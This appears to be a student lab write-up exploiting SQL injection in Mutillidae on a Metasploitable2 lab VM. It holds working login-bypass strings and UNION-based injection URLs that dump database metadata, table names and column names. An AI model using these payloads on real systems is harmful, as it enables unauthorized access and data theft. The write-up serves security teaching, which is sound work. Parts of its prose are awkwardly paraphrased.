# sqlinjection
Exploiting SQL Injection vulnerability

# AIM:
To exploit SQL Injection vulnerability using Multidae web application in Metasploitable2

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode


### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

SQL Injection is a sort of infusion assault that makes it conceivable to execute malicious SQL statements. These statements control a database server behind a web application. Assailants can utilize SQL Injection vulnerabilities to sidestep application safety efforts. They can circumvent authentication and authorization of a page or web application and recover the content of the whole SQL database. 
Identify IP address using ifconfig in Metasploitable2

![Screenshot 2024-04-27 173040](https://github.com/RahulKrishna05/sqlinjection/assets/162027231/eec4976b-72c3-4cb0-a70d-756beaccce83)

Use the above ip address to access the apache webserver of Metasploitable2 from kali linux. In Kali Linux use the ip address in a web browser.

![Screenshot 2024-04-27 173051](https://github.com/RahulKrishna05/sqlinjection/assets/162027231/21cc3249-53b3-41ab-b518-d6e9e8824cd1)

Select Multidae from the menu listed as shown above. You will get the page as displayed below:

![Screenshot 2024-04-27 173117](https://github.com/RahulKrishna05/sqlinjection/assets/162027231/4d8d38d5-8f3a-42ed-b77f-18cd6f809bbd)

Click on the menu Login/Register and register for an account

![Screenshot 2024-04-27 173133](https://github.com/RahulKrishna05/sqlinjection/assets/162027231/57cff2c5-6c31-44fa-b801-fa2357de7031)

Click on the link “Please register here”

![Screenshot 2024-04-27 173155](https://github.com/RahulKrishna05/sqlinjection/assets/162027231/e28427e3-81fb-4a07-bcb5-14971b39ac62)

Click on “Create Account” to display the following page:

![Screenshot 2024-04-27 173212](https://github.com/RahulKrishna05/sqlinjection/assets/162027231/a7b65ab8-9649-4a41-86e7-04936349b0f)

The login structure we will use in our examples is straightforward. It contains two input fields (username and password), which are both vulnerable. The back-end content creates a query to approve the username and secret key given by the client. Here is an outline of the page rationale:

![Screenshot 2024-04-27 173228](https://github.com/RahulKrishna05/sqlinjection/assets/162027231/ff07c9a2-323c-480b-aa3f-18b3d4cc067d)

($query = “SELECT * FROM users WHERE username=’$_POST[username]’ AND password=’$_POST[password]’“;).
 For the username put “ganesh” or “anything” and for the password put (anything’ or ‘1’=’1) or (admin’ or ‘1’=’1) then try to log in, and you’ll be presented with an admin login page.

 ![Screenshot 2024-04-27 173239](https://github.com/RahulKrishna05/sqlinjection/assets/162027231/3f8fadb2-e139-4a9c-b16c-ea4480efebbd)

Click “Login”. The logged in page will show as below:

![Screenshot 2024-04-27 173256](https://github.com/RahulKrishna05/sqlinjection/assets/162027231/f5e3aee6-3d41-41fa-9797-4f1a42f381fe)

##Bypassing login field

The username field is vulnerable. Put (ganesh’ #) or (ganesh’--) in the username field and hit “Enter” to log in. We use “#” or “--” to comment everything in the query sentence that comes after the username filed telling the database to disregard the password field: (SELECT * FROM users WHERE username=’admin’ # AND password=’ ‘). By using line commenting, the aggressor eliminates a part of the login condition and gains access. This technique will make the “WHERE” clause true only for one user; in this case, it is “ganesh.”

Now after logging out you will see the login page. In the login page give ganesh’ # . You can see the page now enters into the administrator page as before when giving the password. 

![Screenshot 2024-04-27 173316](https://github.com/RahulKrishna05/sqlinjection/assets/162027231/91c20ed0-a513-4562-907a-90f981c877bf)

Click the login button and you will see it enter into the administrator page.

![Screenshot 2024-04-27 173333](https://github.com/RahulKrishna05/sqlinjection/assets/162027231/072ce870-ab3d-4628-b839-22276da48d3f)

## Union-based SQL injection
UNION-based SQL injection assaults enable the analyzer to extract data from the database effectively. Since the “UNION” operator must be utilized if the two inquiries have precisely the same structure, the attacker must craft a “SELECT” statement like the first inquiry. 
we will be using the “User Info” page from Mutillidae to perform a Union-Based SQL injection attack. Go to “OWASP Top 10/A1 — Injection/SQLi — Extract-Data/User Info” 

After logging out, Now choose the menu as shown below:

![Screenshot 2024-04-27 173430](https://github.com/RahulKrishna05/sqlinjection/assets/162027231/386ee062-4a83-47b7-bd56-1cadb783eeb4)

![Screenshot 2024-04-27 173629](https://github.com/RahulKrishna05/sqlinjection/assets/162027231/c1152754-f3c1-4149-ae95-67b03dff0240)

![Screenshot 2024-04-27 173646](https://github.com/RahulKrishna05/sqlinjection/assets/162027231/e0be8f6d-ace2-42e4-ab71-a70a20a81d49)

![Screenshot 2024-04-27 173704](https://github.com/RahulKrishna05/sqlinjection/assets/162027231/89a6b93c-f229-4603-89a6-c499348e7112)

![Screenshot 2024-04-27 173721](https://github.com/RahulKrishna05/sqlinjection/assets/162027231/6a632e7a-56a3-46f7-94c0-e08e8d2b52b5)

From this point, all our attack vectors will be performed in the URL section of the page using the Union-Based technique.There are two different ways to discover how many columns are selected by the original query. The first is to infuse an “ORDER BY” statement indicating a column number. Given the column number specified is higher than the number of columns in the “SELECT” statement, an error will be returned.

![Screenshot 2024-04-27 173736](https://github.com/RahulKrishna05/sqlinjection/assets/162027231/1eeaa8ed-8f27-45ec-b125-413c10eeff1a)


Since we do not know the number of columns, we start at 1. To find the exact amount of columns, the number is incremented until an error related to the “ORDER BY” clause is returned. In this example, we incremented it to 6 and received an error message, so it means that the number of columns is lower than 6.

The browser url of this info page need to be modified with the url as below:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27order%20by%206%23&password=&user-info-php-submit-button=View+Account+Details

![Screenshot 2024-04-27 173750](https://github.com/RahulKrishna05/sqlinjection/assets/162027231/064c20f8-e4ef-45be-8cd2-37a798b8f29d)

After adding the order by 6 into the existing url , the following error statement will be obtained:

![Screenshot 2024-04-27 173807](https://github.com/RahulKrishna05/sqlinjection/assets/162027231/ebe2256f-463b-4dcd-86ff-ed7aa260b430)

When we ordered by 5, it worked and displayed some information. It means there are five columns that we can work with. Following screenshot shows that the url modified to have statement added with ordered by 5 replacing 6.

![Screenshot 2024-04-27 173821](https://github.com/RahulKrishna05/sqlinjection/assets/162027231/02ad4c9a-920d-4a4a-b21b-d5d7b6f18352)

As it is having 5 columns the query worked fine and it provides the correct result

![Screenshot 2024-04-27 173836](https://github.com/RahulKrishna05/sqlinjection/assets/162027231/efda7cdc-5a09-4eb6-8966-2977869abfb0)

Instead of using the "order by" option, let’s use the "union select" option and provide all five columns. Ex: (union select 1,2,3,4,5)

![Screenshot 2024-04-27 173852](https://github.com/RahulKrishna05/sqlinjection/assets/162027231/f42d67a7-1d95-4bdc-96a6-f6a3345de8d5)

As given in the screenshot below columns 2,3,4 are usable in which we can substitute any sql commands to extract necessary information.

![Screenshot 2024-04-27 173912](https://github.com/RahulKrishna05/sqlinjection/assets/162027231/3844dea5-706b-4b5a-b92d-ef90f2e3b9f6)

 Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details

![Screenshot 2024-04-27 173929](https://github.com/RahulKrishna05/sqlinjection/assets/162027231/c94d8455-40c9-4a54-a7fd-d3757f56baa6)

The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5.
In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.

Replace the query in the url with the following one:
union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’


http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details

![Screenshot 2024-04-27 173946](https://github.com/RahulKrishna05/sqlinjection/assets/162027231/586a4470-d58a-440b-8bc6-c04c8352d4f4)

The url once executed will  retrieve table names from the “owasp 10” database.
##Extracting sensitive data such as passwords 

When the attacker knows table names, he needs to discover what the column names are to extract data.

In MySQL, the table “information_schema.columns” gives data about columns in tables. One of the most useful columns to extract is called “column_name.”

Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’).

Here we are trying to extract column names from the “accounts” table.

![Screenshot 2024-04-27 174020](https://github.com/RahulKrishna05/sqlinjection/assets/162027231/435cc8d3-3904-4851-82b1-6db7d36ca903)

The column names of the accounts is displayed below for the following url:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details 

![Screenshot 2024-04-27 174038](https://github.com/RahulKrishna05/sqlinjection/assets/162027231/d189027d-8e0e-4b0e-814e-8aff6a6b21b5)

## Result:

The SQL Injection vulnerability is successfully exploited using the Multidae web application in Metasploitable2.
